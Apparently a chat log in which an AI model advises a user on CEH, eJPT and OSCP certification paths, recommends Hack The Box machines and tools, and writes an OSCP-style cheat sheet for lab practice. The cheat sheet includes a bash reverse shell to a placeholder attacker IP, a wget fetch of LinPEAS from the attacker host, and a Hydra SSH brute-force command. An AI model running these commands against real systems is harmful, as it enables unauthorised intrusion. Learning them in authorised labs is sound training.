  

Claim offer

not very financially strong, so is it a good idea to do CEH, then try and get a job, work up money to then do OSCP while styding Also how many systems do you need to compromise for OSCP?

  

Your idea is actually a **very common path**, but there are a few important realities about the certifications you mentioned.

---

## 1️⃣ Is it a good idea to do CEH first?

The **Certified Ethical Hacker (CEH)** from EC-Council is mainly a **theory-based certification**.

### Pros

- HR departments often recognize it.
    
- It can help you pass **HR screening filters** for junior security roles.
    
- Easier than most hands-on pentesting certs.
    

### Cons

- Many security professionals think it is **overpriced for what it teaches**.
    
- It doesn’t prove real hacking ability.
    
- Many pentesting employers prefer practical certs.
    

💰 The biggest issue:  
CEH is often **$1,200–$2,000+**, which is a lot if money is tight.

---

## 2️⃣ A better budget path (very common today)

Many people now do:

1. **eLearnSecurity Junior Penetration Tester (eJPT)**
    
2. **Hack The Box practice**
    
3. **OffSec Certified Professional (OSCP)**
    

Why?

- eJPT is **cheap (~$200)**.
    
- It proves **hands-on skills**.
    
- Employers respect practical labs more than CEH.
    

So financially it often looks like:

HTB practice (free/cheap)  
↓  
eJPT (~$200)  
↓  
Entry security job / SOC / junior pentest  
↓  
Save money  
↓  
OSCP

Many people skip CEH completely unless their employer pays for it.

---

## 3️⃣ How many systems must you compromise for OSCP?

The **OffSec Certified Professional (OSCP)** exam scoring changed recently.

### Current exam structure (approximate)

You must earn **70 points** to pass.

Typical exam lab:

|Target|Points|
|---|---|
|Active Directory set|40|
|Standalone machine|20|
|Standalone machine|20|
|Standalone machine|10|
|Standalone machine|10|

### Example ways to pass

You could pass by:

- AD set (40) + 20 + 10 = **70**
    
- 20 + 20 + 20 + 10 = **70**
    

So usually you must compromise **about 3–4 machines** depending on which ones.

You also must submit a **professional penetration testing report**.

⏱ Exam time: **24 hours hacking + 24 hours report writing**

---

## 4️⃣ What employers actually want (important)

For **entry pentesting**, companies care more about:

- Real lab experience
    
- Writeups
    
- Tool usage
    
- Methodology
    

Good platforms:

- Hack The Box
    
- TryHackMe
    
- PortSwigger Web Security Academy
    

These build **real skills**.

---

## 5️⃣ Honest advice if money is tight

Best realistic path:

1️⃣ Learn fundamentals (Linux, networking, web)  
2️⃣ Practice on **HTB / TryHackMe**  
3️⃣ Do **eJPT**  
4️⃣ Build GitHub writeups  
5️⃣ Apply for:

- SOC analyst
    
- junior pentester
    
- vulnerability analyst
    

6️⃣ Then save for **OSCP**

---

✅ **Key takeaway**

If you are paying yourself:

- **CEH → not great value**
    
- **eJPT → much better for the price**
    

---

💡 If you want, I can also show you:

- The **exact Hack The Box machines that best prepare for OSCP**
    
- A **0 → OSCP roadmap (cheapest possible path)**
    
- How people **pass OSCP in ~6 months** from beginner level.
    

  

Yes please Best htb machines for oscp Oscp road map. I have money for CEH, but #1 thing is saving up money to afford it, and I don't know how credible eJPT is I'm almost done with my Ethical Hacker course from Cisco just as a bonus

  

Since you’re already doing the **Cisco Ethical Hacker**, you’re actually in a **good starting position**. That course covers fundamentals, which helps a lot before moving into practical labs like **Hack The Box** or the **OffSec Certified Professional (OSCP)**.

Let’s break this down clearly so you can **spend your money wisely**.

---

# 1️⃣ Is eJPT credible compared to CEH?

The **eLearnSecurity Junior Penetration Tester (eJPT)** is actually **very respected technically**, even if HR knows CEH more.

### CEH (Certified Ethical Hacker (CEH))

Pros

- HR recognizes it.
    
- Appears in job requirements sometimes.
    
- Theory + multiple choice.
    

Cons

- Very expensive.
    
- Not hands-on.
    

### eJPT

Pros

- Hands-on hacking exam.
    
- Much cheaper.
    
- Shows real pentesting skills.
    

Cons

- Some HR people don’t know it.
    

💡 Reality in the industry:

- **HR likes CEH**
    
- **Hackers respect eJPT**
    

If money matters, **eJPT → HTB → OSCP** is a very common path.

---

# 2️⃣ Best Hack The Box machines for OSCP

These are from well-known OSCP preparation lists.

## Beginner OSCP-style boxes

Start with these first:

- Lame
    
- Blue
    
- Devel
    
- Nibbles
    
- Bashed
    
- Shocker
    
- Optimum
    
- Legacy
    
- Granny
    
- Grandpa
    

These focus on:

- basic enumeration
    
- simple exploits
    
- privilege escalation
    

Many OSCP preparation guides recommend these early boxes. 

---

## Intermediate machines (closer to OSCP difficulty)

After that move to:

- Cronos
    
- Nineveh
    
- SolidState
    
- Chatterbox
    
- Valentine
    
- Popcorn
    
- Jeeves
    
- Bart
    
- Bastard
    

These introduce more complex attack paths. 

---

## Active Directory practice (very important now)

Modern OSCP includes **Active Directory attacks**, so these are great:

- Active
    
- Forest
    
- Sauna
    
- Cascade
    
- Monteverde
    

These machines specifically practice **AD enumeration and privilege escalation**, which are important for the exam. 

---

# 3️⃣ OSCP roadmap (cheap version)

Here’s the roadmap I recommend **based on your situation**.

### Phase 1 — Foundations (1–2 months)

Finish your Cisco course.

Learn:

- Linux
    
- networking
    
- web basics
    
- bash
    

Tools to learn:

- nmap
    
- gobuster
    
- nikto
    
- netcat
    
- burpsuite
    

---

### Phase 2 — Beginner labs (2–3 months)

Platforms:

- TryHackMe
    
- Hack The Box
    

Recommended THM paths:

- Pre Security
    
- Jr Penetration Tester
    
- Offensive Pentesting
    

Then start HTB boxes.

Goal:

**20–30 machines**

---

### Phase 3 — First certification (optional)

Take **eJPT**.

It proves you can:

- enumerate networks
    
- exploit services
    
- pivot
    
- write reports
    

---

### Phase 4 — Serious OSCP preparation

Do:

- 50+ machines
    
- Active Directory labs
    
- privilege escalation practice
    

Platforms:

- Hack The Box
    
- OffSec Proving Grounds
    

Many people follow **TJ Null’s OSCP machine list**.

---

### Phase 5 — OSCP

Take the **OffSec Certified Professional (OSCP)**.

Exam:

- 24 hours hacking
    
- multiple machines
    
- report submission
    
- 70 points required
    

---

# 4️⃣ How long this realistically takes

Typical timeline:

|Stage|Time|
|---|---|
|Basics|2 months|
|HTB practice|3–6 months|
|OSCP prep|3 months|

Total: **6–12 months**

---

# 5️⃣ My honest recommendation for YOU

Since money is tight:

Option A (best value)

Finish Cisco course  
↓  
HackTheBox practice  
↓  
eJPT  
↓  
Get junior job  
↓  
Save for OSCP

Option B (if you really want CEH)

Cisco course  
↓  
CEH  
↓  
SOC / security analyst job  
↓  
Save money  
↓  
OSCP

But if **you pay CEH yourself**, it's usually **not the best investment**.

---

✅ **Important:**  
What actually gets pentesting jobs is:

- OSCP
    
- real lab experience
    
- GitHub writeups
    
- bug bounty experience
    

Not CEH alone.

---

💡 If you want, I can also show you:

- **The 15 MOST IMPORTANT OSCP machines** (the ones nearly everyone does)
    
- A **daily practice routine for HTB** that makes people improve very fast
    
- The **biggest mistakes people make when preparing for OSCP** (that cost them months).
    

  

Show me all of those yes please And another thing. In my country CEH costs $400, which makes it a lot better

  

If you can get the **Certified Ethical Hacker (CEH)** for **~$400**, that actually **changes the calculation a lot**. In many countries it costs **$1200–$2000**, which is why people often say it's not worth it. At **$400**, it becomes a **reasonable HR-filter certification**, especially if you're trying to land your **first security job** in places where HR checks certs.

Since you're finishing the **Cisco Ethical Hacker course, that means you’ll likely already know a good portion of the CEH theory, which could make passing easier.

So your path could realistically look like:

Cisco Ethical Hacker  
↓  
CEH ($400)  
↓  
Hack The Box practice  
↓  
Entry cybersecurity job (SOC / junior security)  
↓  
Save money  
↓  
OSCP

Now let’s go through the **three things you asked for**.

---

# 1️⃣ The 15 MOST important Hack The Box machines for OSCP prep

These machines are repeatedly recommended in OSCP prep lists.

### Beginner / Core OSCP Skills

Start with these:

- Lame
    
- Blue
    
- Legacy
    
- Devel
    
- Optimum
    
- Nibbles
    
- Bashed
    

These teach:

- SMB exploitation
    
- Windows privilege escalation
    
- Linux enumeration
    
- basic web exploitation
    

---

### Intermediate (closer to OSCP difficulty)

Next do:

- Shocker
    
- Nineveh
    
- Cronos
    
- SolidState
    
- Valentine
    

These add:

- web vulnerabilities
    
- reverse shells
    
- better enumeration
    

---

### Privilege escalation focused

Very useful for OSCP:

- Sense
    
- Bastard
    
- Chatterbox
    

These machines train you to:

- enumerate properly
    
- escalate privileges when initial access is easy
    

---

# 2️⃣ The BEST Active Directory practice machines

Modern **OffSec Certified Professional (OSCP) exams include AD attacks.

Best HTB machines for this:

- Active
    
- Forest
    
- Sauna
    
- Cascade
    
- Monteverde
    

Skills you learn:

- Kerberoasting
    
- LDAP enumeration
    
- BloodHound
    
- domain privilege escalation
    

---

# 3️⃣ Daily HTB training routine (this works very well)

If you want to improve quickly, follow something like this:

### 2–3 hours per day

**Step 1 — Enumeration (30–40 min)**  
Always start with:

- nmap
    
- gobuster
    
- nikto
    
- smb enumeration
    
- manual inspection
    

This is the **most important OSCP skill**.

---

**Step 2 — Exploitation (60 min)**

Try:

- public exploits
    
- manual exploitation
    
- Metasploit (sparingly)
    

Remember:

OSCP prefers **manual exploitation**.

---

**Step 3 — Privilege Escalation (30–40 min)**

Practice using:

Linux:

- linpeas
    
- sudo -l
    
- cron jobs
    
- SUID files
    

Windows:

- winPEAS
    
- token impersonation
    
- service misconfigurations
    

---

**Step 4 — Write notes**

Write down:

- commands used
    
- vulnerabilities found
    
- escalation method
    

This becomes your **OSCP methodology notebook**.

---

# 4️⃣ Biggest OSCP preparation mistakes

These cost people **months of wasted effort**.

### ❌ Mistake 1 — Watching walkthroughs too quickly

If you're stuck for 20 minutes, keep trying.

Only check hints after **1–2 hours**.

---

### ❌ Mistake 2 — Not learning enumeration

Enumeration is **80% of OSCP**.

Many people rush exploitation instead.

---

### ❌ Mistake 3 — No note-taking system

Use:

- Obsidian
    
- CherryTree
    
- Notion
    

Build a **personal hacking wiki**.

---

### ❌ Mistake 4 — Too few machines

You should compromise roughly:

**50–70 machines before OSCP.**

---

# 5️⃣ How many machines you should aim for

A strong OSCP preparation target:

|Platform|Machines|
|---|---|
|TryHackMe|20|
|Hack The Box|30|
|Proving Grounds|20|

Total:

**~70 machines**

---

# 6️⃣ A powerful trick most beginners miss

When doing **Hack The Box**, focus on **retired machines first**.

Why?

- Writeups exist
    
- You can learn faster
    
- They match OSCP style
    

Active machines are better **later**.

---

# 7️⃣ Realistic salary potential (South Africa)

In **South Africa**, entry cybersecurity roles often start around:

SOC Analyst:

- ~$900 – $2000/month equivalent
    

Junior pentester:

- ~$1500 – $3000/month equivalent
    

With **OSCP**, salaries increase significantly.

---

# 8️⃣ One last important tip

If your goal is **penetration testing**, also spend time on:

- **PortSwigger Web Security Academy**
    

It is **one of the best web hacking resources in the world** and completely free.

---

✅ If you'd like, I can also show you:

- **The fastest path from beginner → OSCP (most efficient order)**
    
- **How people get pentesting jobs WITHOUT OSCP**
    
- **The exact tools OSCP candidates master (top 20 tools)**.
    

  

Show me the tools

  

For the **OffSec Certified Professional (OSCP)**, the exam is less about knowing hundreds of tools and more about **mastering a small core toolkit**. Most successful candidates rely on **~20 tools total**.

I’ll show you the **most important ones**, grouped by stage of an attack.

---

# 1️⃣ Enumeration tools (MOST IMPORTANT)

Enumeration is **80% of OSCP**. If you miss something here, you won’t get the box.

### Network scanning

- Nmap
    
- RustScan
    

You’ll use these for:

- open ports
    
- service versions
    
- operating system detection
    

Example workflow:

rustscan -> nmap detailed scan

---

### Web enumeration

- Gobuster
    
- FFUF
    
- Nikto
    

Used to find:

- hidden directories
    
- admin panels
    
- backup files
    
- vulnerable endpoints
    

---

### SMB enumeration

- enum4linux
    
- smbclient
    

These help find:

- shared folders
    
- usernames
    
- anonymous access
    

---

# 2️⃣ Exploitation tools

These help gain initial access.

### Exploit database

- Searchsploit
    

Search local exploits quickly:

searchsploit apache

---

### Exploitation framework

- Metasploit Framework
    

Important note:

OSCP allows **Metasploit on only one target**.

So learn **manual exploitation first**.

---

### Password attacks

- Hydra
    
- John the Ripper
    

Used for:

- SSH brute force
    
- cracking password hashes
    

---

# 3️⃣ Web exploitation tools

Almost every OSCP exam has **a web attack**.

### Intercepting proxy

- Burp Suite
    

Use it for:

- intercepting requests
    
- modifying parameters
    
- testing injections
    

---

### SQL attacks

- SQLMap
    

Automates database exploitation.

---

# 4️⃣ Reverse shells / access

Once you exploit something, you need a shell.

### Netcat

- Netcat
    

Used for:

- reverse shells
    
- bind shells
    
- port listeners
    

Example:

nc -lvnp 4444

---

# 5️⃣ Privilege escalation tools

Once inside a system, you must become **root or administrator**.

### Linux privilege escalation

- LinPEAS
    
- pspy
    

They help find:

- SUID binaries
    
- cron jobs
    
- writable services
    

---

### Windows privilege escalation

- WinPEAS
    

Finds:

- weak services
    
- token privileges
    
- credential leaks
    

---

# 6️⃣ Active Directory tools

Modern OSCP requires **basic AD attacks**.

### AD enumeration

- BloodHound
    

Shows privilege escalation paths in domains.

---

### Kerberos attacks

- Impacket
    

Very powerful tools inside this suite:

- secretsdump
    
- psexec
    
- wmiexec
    

---

# 7️⃣ File transfer tools

You constantly need to upload scripts.

### Web server

- Python HTTP Server
    

Example:

python3 -m http.server 8000

---

# 8️⃣ Your OSCP "core toolkit"

If you master just these, you are **90% ready for OSCP**.

|Purpose|Tools|
|---|---|
|Scanning|Nmap, RustScan|
|Web enumeration|Gobuster, FFUF|
|SMB enumeration|enum4linux|
|Exploitation|Searchsploit|
|Framework|Metasploit|
|Web testing|Burp Suite|
|SQL attacks|SQLMap|
|Password cracking|Hydra, John|
|Shell access|Netcat|
|Linux privesc|LinPEAS|
|Windows privesc|WinPEAS|
|AD attacks|BloodHound, Impacket|

---

💡 **Pro tip:**  
The **most important skill in OSCP is not tools — it's methodology**.

People who pass usually have a **checklist like this**:

1 scan  
2 enumerate  
3 find vulnerability  
4 exploit  
5 stabilize shell  
6 privilege escalate

---

If you'd like, I can also show you something **extremely useful for OSCP preparation**:

- **The exact hacking methodology OSCP students follow** (step-by-step checklist used during the exam).
    
- **A printable OSCP attack cheat sheet** many students keep next to them during labs.
    

  

Cheat sheet please

  

Here is a **clean OSCP-style penetration testing cheat sheet** you can follow during labs or boxes. It’s basically a **step-by-step attack methodology** used by many candidates preparing for the **OffSec Certified Professional (OSCP)**.

You can save this and eventually turn it into your **personal playbook**.

---

# OSCP Penetration Testing Cheat Sheet

## 1️⃣ Initial Port Scanning

Always start by identifying open ports.

Using Nmap:

nmap -sC -sV -oA initial <target-ip>

Full scan if needed:

nmap -p- --min-rate 1000 <target-ip>

Then scan discovered ports:

nmap -sC -sV -p <ports> <target-ip>

Things to note:

- SMB
    
- FTP
    
- SSH
    
- HTTP
    
- RDP
    
- WinRM
    
- databases
    

Write **everything down**.

---

# 2️⃣ Service Enumeration

## SMB (Port 445)

smbclient -L //<target-ip>/

enum4linux -a <target-ip>

Look for:

- anonymous login
    
- shared files
    
- usernames
    

Tools often used:

- enum4linux
    

---

## FTP (Port 21)

ftp <target-ip>

Try:

anonymous:anonymous

Look for:

- writable directories
    
- uploaded shells
    

---

## SSH (Port 22)

If usernames found:

Use Hydra:

hydra -l username -P rockyou.txt ssh://<target-ip>

---

# 3️⃣ Web Enumeration (Most Common Entry)

If port **80 / 443 / 8080** exists:

Directory brute forcing with Gobuster:

gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt

Also try:

/admin  
/login  
/dev  
/test  
/backup  
/uploads

---

Intercept traffic with Burp Suite.

Check for:

- SQL injection
    
- file upload
    
- command injection
    
- login bypass
    

---

# 4️⃣ Finding Exploits

Search locally using Searchsploit:

searchsploit apache

If exploit exists:

- modify it
    
- test it manually
    

Framework option:

- Metasploit Framework
    

(Remember OSCP limits its use.)

---

# 5️⃣ Getting a Reverse Shell

Use Netcat listener:

nc -lvnp 4444

Common reverse shell:

bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

Stabilize shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Then:

export TERM=xterm

---

# 6️⃣ Linux Privilege Escalation

Upload LinPEAS.

wget http://<attacker-ip>:8000/linpeas.sh  
chmod +x linpeas.sh  
./linpeas.sh

Check manually:

sudo -l

Look for:

- SUID files
    
- cron jobs
    
- writable services
    
- PATH hijacking
    

---

# 7️⃣ Windows Privilege Escalation

Upload WinPEAS.

Look for:

- weak services
    
- credential files
    
- unquoted service paths
    
- privilege tokens
    

---

# 8️⃣ File Transfer Methods

Host files with Python:

python3 -m http.server 8000

Download on victim:

wget http://<attacker-ip>:8000/file

---

# 9️⃣ Password Cracking

Use John the Ripper:

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

---

# 🔟 Active Directory Enumeration

Use BloodHound.

Collect data using:

bloodhound-python

Look for:

- Kerberoasting
    
- privilege paths
    
- domain admin routes
    

---

# 1️⃣1️⃣ OSCP Exam Strategy

Time management for the 24-hour exam:

|Time|Action|
|---|---|
|Hour 0–1|Scan everything|
|Hour 1–4|Enumerate web services|
|Hour 4–10|Exploit easy boxes|
|Hour 10–20|Privilege escalation|
|Hour 20–24|Documentation|

Documentation is **critical**.

---

# 1️⃣2️⃣ Your Personal OSCP Checklist

Before giving up on a machine:

Check:

✔ all ports scanned  
✔ directories brute forced  
✔ SMB shares checked  
✔ password attacks attempted  
✔ exploit-db checked  
✔ manual code review  
✔ privilege escalation scripts run

---

💡 **My biggest recommendation for you next**

Since you're already doing the **Cisco Ethical Hacker**, the next **high-impact step** is to start practicing on **Hack The Box** immediately.

Try to reach:

**30 machines compromised before thinking about OSCP.**

---

If you want, I can also show you something extremely useful that many beginners never see:

- **The “TJ Null OSCP machine list”** (the famous list most OSCP students train on)
    
- **The 10 boxes that teach the most privilege escalation skills**
    
- **How some people pass OSCP on the first attempt** (their preparation strategy).